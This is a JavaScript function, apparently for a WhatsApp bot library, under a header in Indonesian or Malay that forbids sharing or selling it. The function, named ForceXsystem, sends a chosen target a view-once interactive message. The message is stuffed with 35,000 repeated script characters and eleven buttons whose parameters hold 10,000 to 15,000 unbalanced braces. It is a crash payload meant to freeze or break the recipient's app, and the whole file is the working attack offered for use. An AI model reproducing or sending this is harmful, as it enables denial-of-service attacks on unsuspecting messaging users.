/*

  CREATED BY:
   **Amelia****
     
     TIDAK BOLEH SHARE KE PT KHUSUS OWNER 
     JANGAN JUAL DAN JANGAN BAGI & JANGAN BAGIKAN KE PT
     
*/

async function ForceXsystem(target) {
  let message = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 99999999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          },
          body: {
            text: "Tiada Hidup Dengan Kebahagiaan" + "ꦾ".repeat(35000),
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(15000),
            buttons: [
              {
              name: "single_select",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "call_permission_request",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "cta_url",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "cta_call",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "cta_copy",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "cta_reminder",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "cta_cancel_reminder",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "address_message",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "send_location",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "quick_reply",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "mpm",
              ParamsJson: "{".repeat(10000),
              version: 3
              },
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(target, message, {
    participant: { jid: target },
  });
}